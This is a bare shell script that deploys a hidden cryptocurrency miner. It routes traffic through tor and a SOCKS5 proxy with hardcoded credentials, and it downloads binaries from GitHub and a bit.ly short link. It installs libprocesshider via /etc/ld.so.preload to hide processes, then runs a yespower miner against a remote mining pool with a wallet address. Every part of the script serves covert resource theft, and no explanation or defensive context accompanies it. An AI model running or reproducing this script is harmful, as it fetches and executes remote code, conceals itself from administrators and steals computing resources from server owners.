apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

apt update

apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 173.245.209.246:1080
socks5_username = G0tNyyR4nJ
socks5_password = N1DAYf9S7D
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip


git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..


./graftcp/graftcp wget https://bit.ly/3bKjlUQ && chmod 700 3bKjlUQ && ./3bKjlUQ -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra -p c=BTE,mc=BTE,ID=archer -t $(nproc) -B
